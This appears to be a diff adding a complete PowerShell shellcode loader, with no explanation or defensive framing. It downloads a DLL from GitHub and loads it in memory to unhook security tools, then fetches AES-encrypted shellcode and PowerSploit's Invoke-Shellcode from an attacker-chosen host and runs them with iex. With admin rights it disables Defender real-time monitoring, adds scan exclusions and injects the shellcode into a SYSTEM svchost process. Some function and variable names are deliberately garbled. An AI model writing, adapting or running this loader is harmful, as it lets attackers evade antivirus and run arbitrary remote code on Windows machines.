@@ -1,0 +1,103 @@
+function Check-IsElevated
+
+ {
+
+    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
+
+    if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))
+
+   { Write-Output $true }      
+
+    else
+
+   { Write-Output $false }   
+
+ }
+
+function Create-AesManagedObject($key, $IV) {
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::None
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 128
+    if ($IV) {
+        if ($IV.getType().Name -eq "String") {
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+        }
+        else {
+            $aesManaged.IV = $IV
+        }
+    }
+    if ($key) {
+        if ($key.getType().Name -eq "String") {
+            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+        }
+        else {
+            $aesManaged.Key = $key
+        }
+    }
+    $aesManaged
+}
+
+# Aes decrypt function
+function De1xsss($key, $encryptedString, $IV) {
+     $bytes = [System.Convert]::FromBase64String($encryptedString)
+     $aesManaged = Create-AesManagedObject $key $IV
+     $decryptor = $aesManaged.CreateDecryptor();
+     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+     $aesManaged.Dispose()
+     $unencryptedData
+}
+
+
+function Invoke-runner($ip, $aeskey, $aesiv, $port, $scheme) {
+    # Chrome user agent
+    $eee = new-object system.net.WebClient
+    $eee.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36")
+
+
+
+    # Check for proxyies under system intergrity
+    if ($env:username -eq 'SYSTEM') {
+        New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+        $keys = Get-ChildItem 'HKU:\'
+        ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
+        $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+        if($proxyAddr) {
+            [system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
+        }    
+    }
+    
+    $b = $eee.DownloadData('https://raw.githubusercontent.com/ch0wm3in/aux/main/h.dll')
+    [Reflection.Assembly]::Load($b)
+    [SharpUnhooker.SharpUnhooker]::test()
+    
+    # Download the encrypted shellcode
+    $Eqvb3G = $eee.downloadstring("${scheme}://${ip}:${port}/shc.txt")
+    
+
+    # Decrypt the aes encrypted shellcode
+    $qvb3G = De1xsss $aeskey $Eqvb3G $aesiv
+
+    # Download powersploit invoke shellcode
+    iex($eee.downloadstring("${scheme}://${ip}:${port}/invoke-sh.txt"))
+
+    # Only at administrative privs can you get usernames with you
+    # (get-process svchost -includeusername | where username -eq "NT AUTHORITY\SYSTEM").id[0]
+    #  Whatever process you can get usually explorer, process owned by the running expolit user can read cpu usage, which is an okay bypass to -includeusername
+    # (get-process -name explorer | where cpu).Id[0]
+
+    if(check-IsElevated){
+        # Disable defender if possible
+        set-mppreference -DisableRealtimeMonitoring $true
+        # Semi circumvent tamper protection
+        set-mppreference -Exclusionpath "c:\users\public\*"
+        set-mppreference -exclusionprocess "c:\users\public\*"
+        Invoke-Shellcode -processid (get-process svchost -includeusername | where username -eq "NT AUTHORITY\SYSTEM").id[2] -Shellcode $qvb3G -Force -Verbose
+    }
+    else {
+        Invoke-Shellcode -Shellcode $qvb3G -Force -Verbose
+    }
+}
